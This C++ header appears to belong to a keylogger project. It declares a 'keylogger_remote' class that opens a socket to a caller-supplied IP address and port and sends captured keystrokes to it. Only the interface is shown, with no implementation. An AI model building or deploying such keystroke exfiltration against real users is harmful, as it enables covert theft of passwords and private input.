#ifndef _KEYLOGGER_REMOTE_HPP_
#define _KEYLOGGER_REMOTE_HPP_

#include "../keylogger.hpp"

using namespace std;

class keylogger_remote : virtual public keylogger
{
    private:
      SOCKET a_socket;

    public:

      /*
  		* Constructor with parameters
  		*
  		* Open attribute a_socket with p_ip_address and p_port
  		*
  		* p_ip_address :  adress ip where send the entry
      * p_port : port to use
  		*/
  		keylogger_remote(string p_ip_address, int p_port);

      /*
      * Destructor
      */
  		virtual ~keylogger_remote();

      /*
      * Store data by sending them to a_socket
      */
  		virtual void store();

      /*
      * Send message p_buffer with size p_bytes_to_send to p_socket
      */
      virtual int send_complete(int p_socket, void** p_buffer, size_t p_bytes_to_send);
  };

#endif
